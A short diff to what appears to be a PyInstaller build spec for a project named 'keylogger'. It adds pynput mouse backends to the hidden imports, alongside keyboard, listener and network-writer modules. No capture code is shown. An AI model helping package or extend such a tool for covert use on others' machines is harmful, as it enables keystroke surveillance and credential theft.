@@ -12,7 +12,10 @@ a = Analysis(
     datas=[],
     hiddenimports=['keylogger', 'keylogger.data_wrapper', 'keylogger.file_writer', 
                    'keylogger.listner', 'keylogger.manager', 'keylogger.network_writer',
-                   'keylogger.processor', 'keylogger.sinker', 'pynput.keyboard._xorg', 'pynput.keyboard._win32'] + requirements,  # כל תת-המודולים
+                   'keylogger.processor', 'keylogger.sinker',
+                   'pynput.keyboard._xorg', 'pynput.keyboard._win32',
+                   'pynput.mouse._xorg', 'pynput.mouse._win32',
+                   ] + requirements,  # כל תת-המודולים
     hookspath=[],
     runtime_hooks=[],
     excludes=[],
